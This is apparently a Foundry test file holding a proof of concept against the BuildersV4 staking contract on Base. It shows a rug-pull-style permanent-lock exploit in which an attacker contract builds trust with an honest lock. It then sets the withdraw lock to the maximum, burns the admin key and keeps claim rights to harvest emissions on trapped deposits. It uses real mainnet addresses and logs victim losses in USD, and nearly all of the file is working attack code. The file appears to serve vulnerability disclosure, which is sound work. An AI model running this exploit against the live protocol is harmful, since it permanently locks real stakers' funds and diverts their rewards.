// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console} from "forge-std/Test.sol";

/*//////////////////////////////////////////////////////////////
  Realistic, live-inducible PoC for the BuildersV4 permanent-lock
  escalation. NO identity cheatcodes:
    - attacker & victims are real deployed CONTRACTS acting as
      themselves (genuine msg.sender; no vm.prank anywhere).
    - the attacker is funded ONLY with native ETH and buys the MOR
      it uses through the real Uniswap V3 pool on Base (no deal of
      MOR to the attacker).
    - victims are seeded with MOR to MODEL real existing stakers.
      Live Builders TVL at the pinned block is ~3,000,551 MOR, so
      100k-MOR stakers are well within what real users hold.
  Cheatcodes used are limited to: createSelectFork, warp (time),
  and deal of *native ETH* (freely acquirable) / *victim MOR*
  (modeling real stakers). None grant any protocol privilege.
//////////////////////////////////////////////////////////////*/

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

interface ISwapRouter02 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata) external payable returns (uint256);
}

struct Subnet {
    string name;
    address admin;
    uint128 unusedStorage1_V4Update;
    uint128 withdrawLockPeriodAfterDeposit;
    uint128 unusedStorage2_V4Update;
    uint256 minimalDeposit;
    address claimAdmin;
}

struct SubnetMetadata {
    string slug;
    string description;
    string website;
    string image;
}

interface IBuildersV4 {
    function createSubnet(Subnet calldata, SubnetMetadata calldata) external;
    function editSubnet(bytes32, Subnet calldata) external;
    function deposit(bytes32, uint256) external;
    function withdraw(bytes32, uint256) external;
    function claim(bytes32, address) external;
    function getSubnetId(string memory) external view returns (bytes32);
    function getCurrentSubnetRewards(bytes32) external view returns (uint256);
    function minimalWithdrawLockPeriod() external view returns (uint256);
}

address constant BUILDERS_ADDR = 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9;
address constant MOR_ADDR      = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
address constant WETH_ADDR     = 0x4200000000000000000000000000000000000006;
address constant ROUTER_ADDR   = 0x2626664c2603336E57B271c5C0b26F421741e481; // Uniswap SwapRouter02 (Base)
uint24  constant POOL_FEE      = 3000;

/// Real attacker: starts with ETH only, buys MOR on Uniswap, runs the subnet.
contract AttackerBot {
    IBuildersV4 constant B = IBuildersV4(BUILDERS_ADDR);
    IERC20 constant MOR = IERC20(MOR_ADDR);

    /// Self-fund: wrap ETH, swap to MOR on the real pool. Returns MOR received.
    function selfFundWithEth(uint256 ethIn) external returns (uint256) {
        IWETH(WETH_ADDR).deposit{value: ethIn}();
        IWETH(WETH_ADDR).approve(ROUTER_ADDR, ethIn);
        return ISwapRouter02(ROUTER_ADDR).exactInputSingle(
            ISwapRouter02.ExactInputSingleParams({
                tokenIn: WETH_ADDR,
                tokenOut: MOR_ADDR,
                fee: POOL_FEE,
                recipient: address(this),
                amountIn: ethIn,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
    }

    function createHonestSubnet(string calldata name, uint128 lock) external {
        Subnet memory s;
        s.name = name;
        s.admin = address(this);
        s.withdrawLockPeriodAfterDeposit = lock;
        s.minimalDeposit = 0;
        s.claimAdmin = address(this);
        B.createSubnet(s, SubnetMetadata("", "", "", ""));
    }

    function seedOwnSubnet(bytes32 id, uint256 amount) external {
        MOR.approve(BUILDERS_ADDR, amount);
        B.deposit(id, amount);
    }

    /// Spring the trap: max lock, burn admin, keep claimAdmin = self.
    function springTrap(bytes32 id, string calldata name) external {
        Subnet memory s;
        s.name = name;
        s.admin = address(0xdead);
        s.withdrawLockPeriodAfterDeposit = type(uint128).max;
        s.minimalDeposit = 0;
        s.claimAdmin = address(this);
        B.editSubnet(id, s);
    }

    function harvest(bytes32 id) external {
        B.claim(id, address(this));
    }
}

/// Real honest staker: an ordinary contract that deposits and withdraws.
contract StakerBot {
    IBuildersV4 constant B = IBuildersV4(BUILDERS_ADDR);
    IERC20 constant MOR = IERC20(MOR_ADDR);

    function stake(bytes32 id, uint256 amount) external {
        MOR.approve(BUILDERS_ADDR, amount);
        B.deposit(id, amount);
    }

    function unstake(bytes32 id, uint256 amount) external {
        B.withdraw(id, amount);
    }
}

contract BuildersV4LockRealTest is Test {
    IBuildersV4 constant BUILDERS = IBuildersV4(BUILDERS_ADDR);
    IERC20 constant MOR = IERC20(MOR_ADDR);

    uint256 constant PRICE_1e6 = 699275; // $0.699275 (historical, for USD logging)

    AttackerBot attacker;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("base"), 58_680_000);
        attacker = new AttackerBot();
        // ETH is freely acquirable; this is the attacker's only funding.
        vm.deal(address(attacker), 100 ether);
    }

    function _usd(uint256 morWei) internal pure returns (uint256) {
        return morWei * PRICE_1e6 / 1e6 / 1e18;
    }

    // Model a real staker holding MOR (acquired off-DEX over time, like today's
    // 3M MOR of live stakers). Returns the funded bot.
    function _newStaker(uint256 morAmount) internal returns (StakerBot b) {
        b = new StakerBot();
        deal(MOR_ADDR, address(b), morAmount);
    }

    // -------------------------------------------------------------------------
    // Full realistic attack an attacker could run today:
    //  1. attacker starts with ETH only, buys MOR on Uniswap, seeds its subnet
    //  2. honest 7-day lock; an early staker deposits and withdraws cleanly
    //  3. reassured victims pile in (100k each)
    //  4. attacker springs the trap in ONE tx and burns admin
    //  5. every victim is permanently locked
    //  6. attacker keeps harvesting emissions on the trapped principal
    // -------------------------------------------------------------------------
    function test_live_inducible_full_attack() public {
        string memory name = "ai-grants-pool";
        uint128 minLock = uint128(BUILDERS.minimalWithdrawLockPeriod());

        // (1) attacker self-funds with ETH via the real Uniswap pool
        uint256 morBought = attacker.selfFundWithEth(20 ether);
        console.log("Attacker MOR bought with 20 ETH (self-funded):", morBought / 1e18);
        assertGt(morBought, 0, "attacker acquired MOR with ETH only");

        attacker.createHonestSubnet(name, minLock);
        bytes32 id = BUILDERS.getSubnetId(name);
        attacker.seedOwnSubnet(id, morBought); // admin seeds its own pool -> looks legit

        // (2) early staker trusts it: deposits then withdraws cleanly after 7 days
        StakerBot early = _newStaker(20_000e18);
        early.stake(id, 20_000e18);
        vm.warp(block.timestamp + minLock + 1);
        early.unstake(id, 20_000e18);
        assertEq(MOR.balanceOf(address(early)), 20_000e18, "early staker withdrew -> subnet looks safe");

        // (3) reassured victims pile in at 100k each
        StakerBot v1 = _newStaker(100_000e18);
        StakerBot v2 = _newStaker(100_000e18);
        StakerBot v3 = _newStaker(100_000e18);
        v1.stake(id, 100_000e18);
        vm.warp(block.timestamp + 5 days);
        v2.stake(id, 100_000e18);
        vm.warp(block.timestamp + 5 days);
        v3.stake(id, 100_000e18);

        uint256 trapped = 300_000e18;
        StakerBot[3] memory vs = [v1, v2, v3];

        // (4) spring the trap in one tx and abandon admin to a burn address
        attacker.springTrap(id, name);

        // (5) PERMANENCE: demonstrate the lock holds at an extreme future time.
        //     Snapshot first so we can rewind and harvest within a realistic window.
        uint256 snap = vm.snapshotState();
        vm.warp(block.timestamp + 36500 days); // +100 years
        for (uint256 i; i < 3; i++) {
            vm.expectRevert();
            vs[i].unstake(id, 100_000e18);
            assertEq(MOR.balanceOf(address(vs[i])), 0, "victim principal trapped forever");
        }
        console.log("Permanently trapped victim MOR:", trapped / 1e18);
        console.log("USD at $0.699275:", _usd(trapped));
        vm.revertToState(snap);

        // (6) HARVEST: within a realistic window (treasury holds ~53.5k MOR), the
        //     attacker's retained claimAdmin harvests emissions accruing on the
        //     trapped principal while victims remain locked.
        vm.warp(block.timestamp + 120 days);
        // victims are still locked at this ordinary near-future time
        vm.expectRevert();
        v1.unstake(id, 100_000e18);

        uint256 pending = BUILDERS.getCurrentSubnetRewards(id);
        assertGt(pending, 0, "trapped principal still earns emissions");
        uint256 before = MOR.balanceOf(address(attacker));
        attacker.harvest(id);
        uint256 gained = MOR.balanceOf(address(attacker)) - before;
        assertGt(gained, 0, "attacker harvested emissions while victims stay locked");
        console.log("Attacker emissions harvested in 120 days (MOR):", gained / 1e18);
        console.log("USD at $0.699275:", _usd(gained));
    }

    // -------------------------------------------------------------------------
    // Baseline: under an honest lock the documented "withdraw any time after the
    // lock" invariant holds (no prank; ordinary contract staker).
    // -------------------------------------------------------------------------
    function test_baseline_honest_withdraw() public {
        string memory name = "honest-pool";
        uint128 minLock = uint128(BUILDERS.minimalWithdrawLockPeriod());
        attacker.createHonestSubnet(name, minLock);
        bytes32 id = BUILDERS.getSubnetId(name);

        StakerBot s = _newStaker(100_000e18);
        s.stake(id, 100_000e18);
        vm.warp(block.timestamp + minLock + 1);
        s.unstake(id, 100_000e18);
        assertEq(MOR.balanceOf(address(s)), 100_000e18, "honest lock honored");
    }
}
